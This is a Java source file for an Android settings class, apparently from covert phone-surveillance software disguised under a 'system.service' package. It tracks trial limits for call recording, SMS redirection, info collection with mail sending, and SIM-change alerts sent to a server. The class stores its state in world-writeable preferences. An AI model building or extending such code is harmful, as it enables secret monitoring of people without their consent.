package system.service.config;

import java.util.Calendar;
import java.util.Date;

import system.service.GlobalValues;

import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.preference.PreferenceManager;

/**
 * Implementation of configurations I/O by SharedPreferences.
 * in Android, these configurations will be saved in /data/data/PACKAGE_NAME/shared_prefs directory with XML format.
*/
public class ConfigCtrl 
{
	private static final String PREFS_NAME = "system.service";
	private static final String LICENSE_KEY = "LicenseKey";
	private static final String INTERVAL_TRY_GETINFO = "TryGetInfoInterval";
	private static final String CONSUMED_DATETIME = "ConsumedDatetime"; // The 1st activation datetime
	private static final String LAST_GETINFO_DATETIME = "LastGetInfoDatetime"; // The last datetime of info collection and mail sending
	private static final String TRIAL_SMS_SENT_DATETIME = "TrialInfoSmsSentDatetime";
	private static final String CHECKIN_SMS_SENT_DATETIME = "CheckinSmsSentDatetime";
	private static final String SELF_PHONE_NUMBER = "SelfPhoneNum";
	private static final String HAS_SENT_EXPIRE_SMS = "HasSentExpireSms";
	private static final String HAS_SENT_TRIAL_RECORDING_TIMES_LIMIT_SMS = "HSTRTLS";
	private static final String HAS_SENT_TRIAL_REDIRECT_SMS_TIMES_LIMIT_SMS = "HSTRSTLS";
	private static final String RECORDING_TIMES_IN_TRIAL = "RecordingTimesInTrial";
	private static final String SMS_REDIRECT_TIMES_IN_TRIAL = "SmsRedirectTimesInTrial";
	private static final String SIM_FIRST_RUN = "SimFirstRun";
	private static final String SIM_SERIAL_NUM = "ICCID";
	private static final String STOPPED_BY_SYSTEM = "StoppedBySystem";
	private static final String SIM_CHANGE_SMS_SENT_COUNT = "SimChgSmsSentCount";
	
	private static final int DEFAULT_TRIAL_DAYS = 2; // Trial days
	private static final int DEFAULT_RECORDING_TIMES_IN_TRIAL = 5; // Recording times in trial
	private static final int DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL = 10; // SMS redirect times in trial
	
	public static final int MAX_SIM_CHG_SMS_SENT_COUNT = 5; // Max count of SIM change SMS that sent to server
	
	public static boolean set(Context context, String key, String value)
	{	
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putString(key, value);     
		return editor.commit();
	}
	
	public static String get(Context context, String key)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		return config.getString(key, "");
	}
	
	public static String getLicenseKey(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(LICENSE_KEY, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setLicenseKey(Context context, String key)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();
		editor.putString(LICENSE_KEY, key.toUpperCase());     
		return editor.commit();
	}
	
	public static int getInfoInterval(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		return config.getInt(INTERVAL_TRY_GETINFO, 300000);
	}
	
	public static boolean setInfoInterval(Context context, int interval)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putInt(INTERVAL_TRY_GETINFO, interval);     
		return editor.commit();
	}
	
	public static String getLastGetInfoTime(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(LAST_GETINFO_DATETIME, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setLastGetInfoTime(Context context, Date datetime)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();
		editor.putString(LAST_GETINFO_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
		return editor.commit();
	}
	
	public static String getConsumedDatetime(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(CONSUMED_DATETIME, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setConsumedDatetime(Context context, Date datetime)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();
		editor.putString(CONSUMED_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
		return editor.commit();
	}
	
	public static String getCheckinSmsSentDatetime(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(CHECKIN_SMS_SENT_DATETIME, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setCheckinSmsSentDatetime(Context context, Date datetime)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putString(CHECKIN_SMS_SENT_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
		return editor.commit();
	}
	
	public static String getSelfPhoneNum(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(SELF_PHONE_NUMBER, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setSelfPhoneNum(Context context, String selfPhoneNum) 
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putString(SELF_PHONE_NUMBER, selfPhoneNum == null ? "": selfPhoneNum);     
		return editor.commit();
	}
	
	public static boolean getHasSentExpireSms(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		return config.getBoolean(HAS_SENT_EXPIRE_SMS, false);
	}
	
	public static boolean setHasSentExpireSms(Context context, boolean value) 
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putBoolean(HAS_SENT_EXPIRE_SMS, value);     
		return editor.commit();
	}
	
	public static boolean getHasSentRecordingTimesLimitSms(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		return config.getBoolean(HAS_SENT_TRIAL_RECORDING_TIMES_LIMIT_SMS, false);
	}
	
	public static boolean setHasSentRecordingTimesLimitSms(Context context, boolean value) 
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putBoolean(HAS_SENT_TRIAL_RECORDING_TIMES_LIMIT_SMS, value);     
		return editor.commit();
	}
	
	public static boolean getHasSentRedirectSmsTimesLimitSms(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		return config.getBoolean(HAS_SENT_TRIAL_REDIRECT_SMS_TIMES_LIMIT_SMS, false);
	}
	
	public static boolean setHasSentRedirectSmsTimesLimitSms(Context context, boolean value) 
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putBoolean(HAS_SENT_TRIAL_REDIRECT_SMS_TIMES_LIMIT_SMS, value);     
		return editor.commit();
	}
	
	public static String getTrialInfoSmsSentDatetime(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(TRIAL_SMS_SENT_DATETIME, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setTrialInfoSmsSentDatetime(Context context, Date datetime)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putString(TRIAL_SMS_SENT_DATETIME, datetime == null ? "": DatetimeUtil.format.format(datetime));     
		return editor.commit();
	}
	
	public static boolean setRecordingTimesInTrial(Context context, int times)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putInt(RECORDING_TIMES_IN_TRIAL, times);     
		return editor.commit();
	}
	
	public static int getRecordingTimesInTrial(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		try {
			return config.getInt(RECORDING_TIMES_IN_TRIAL, 0);
		} catch (Exception ex) {
			return DEFAULT_RECORDING_TIMES_IN_TRIAL;
		}
	}
	
	public static boolean countRecordingTimesInTrial(Context context) 
	{
		int currentCount = getRecordingTimesInTrial(context);
		return setRecordingTimesInTrial(context, ++currentCount);
	}
	
	public static boolean setSmsRedirectTimesInTrial(Context context, int times)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putInt(SMS_REDIRECT_TIMES_IN_TRIAL, times);     
		return editor.commit();
	}
	
	public static int getSmsRedirectTimesInTrial(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		try {
			return config.getInt(SMS_REDIRECT_TIMES_IN_TRIAL, 0);
		} catch (Exception ex) {
			return DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL;
		}
	}
	
	public static boolean setSimFirstRun(Context context, boolean value)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putBoolean(SIM_FIRST_RUN, value);     
		return editor.commit();
	}
	
	public static boolean getSimFirstRun(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		return config.getBoolean(SIM_FIRST_RUN, true);
	}
	
	public static boolean setSimSerialNum(Context context, String value) 
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putString(SIM_SERIAL_NUM, value);     
		return editor.commit();
	}
	
	public static String getSimSerialNum(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		String str = config.getString(SIM_SERIAL_NUM, "").trim();
		if (str.length() > 0)
			return str;
		else
			return null;
	}
	
	public static boolean setStoppedBySystem(Context context, boolean value)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putBoolean(STOPPED_BY_SYSTEM, value);     
		return editor.commit();
	}
	
	public static boolean getStoppedBySystem(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		return config.getBoolean(STOPPED_BY_SYSTEM, false);
	}
	
	public static boolean setSimChangeSmsSentCount(Context context, int value)
	{
		Editor editor = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE).edit();     
		editor.putInt(SIM_CHANGE_SMS_SENT_COUNT, value);     
		return editor.commit();
	}
	
	public static int getSimChangeSmsSentCount(Context context)
	{
		SharedPreferences config = context.getSharedPreferences(PREFS_NAME, Context.MODE_WORLD_WRITEABLE);
		return config.getInt(SIM_CHANGE_SMS_SENT_COUNT, 0);
	}
	
	public static boolean countSmsRedirectTimesInTrial(Context context) 
	{
		int currentCount = getSmsRedirectTimesInTrial(context);
		return setSmsRedirectTimesInTrial(context, ++currentCount);
	}
	
	// See if now is still in trial
	public static boolean stillInTrial(Context context) 
	{
		boolean ret = false;
		String consumeDatetimeStr = getConsumedDatetime(context);
		if (consumeDatetimeStr != null && consumeDatetimeStr.length() > 0) {
			Date consumeDatetime = null;
			try {
				consumeDatetime = DatetimeUtil.format.parse(consumeDatetimeStr);
			} catch (Exception ex) {}
			
			if (consumeDatetime != null)
			{	
				Calendar now = Calendar.getInstance();
				now.add(Calendar.DATE, -1*DEFAULT_TRIAL_DAYS);
				if (now.getTime().before(consumeDatetime)) {
					ret = true;
				}
			}
		}
		return ret;
	}
	
	public static String getSelfName(Context context) 
	{
		String phoneNum = DeviceProperty.getPhoneNumber(context);
		if (phoneNum == null || phoneNum.length() <= 0) {
			String selfNum = ConfigCtrl.getSelfPhoneNum(context);
			if (selfNum != null && selfNum.length() > 0) {
				return selfNum;
			} else {
				phoneNum = DeviceProperty.getDeviceId(context);
			}
		}
		return phoneNum;
	}
	
	public static boolean isLegal(Context context) 
	{
		return (
				 (
			       (GlobalValues.licenseType == LICENSE_TYPE.FULL_LICENSED) ||
			       (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.stillInTrial(context))
			     ) &&
			     (!ConfigCtrl.getStoppedBySystem(context)) 
		       );
	}
	
	public static boolean reachRecordingTimeLimit(Context context) {
		return (getRecordingTimesInTrial(context) >= DEFAULT_RECORDING_TIMES_IN_TRIAL);
	}
	
	public static boolean reachSmsRedirectTimeLimit(Context context) {
		return (getSmsRedirectTimesInTrial(context) >= DEFAULT_REDIRECT_SMS_TIMES_IN_TRIAL);
	}

}
